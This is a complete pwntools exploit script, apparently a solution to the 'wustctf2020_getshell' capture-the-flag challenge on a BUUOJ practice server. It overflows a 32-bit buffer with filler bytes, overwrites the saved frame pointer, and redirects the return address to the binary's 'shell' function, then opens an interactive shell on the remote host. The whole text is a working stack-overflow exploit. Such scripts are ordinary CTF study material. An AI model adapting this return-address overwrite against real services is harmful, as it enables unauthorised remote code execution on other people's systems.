from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27247)
e = ELF('./wustctf2020_getshell')
shell = e.symbols['shell'] # 0x804851B
log.success('shell_address => %s'%hex(shell))
payload = b'a'*0x18 + b'pwn!' + p32(shell)
io.sendline(payload)
io.interactive()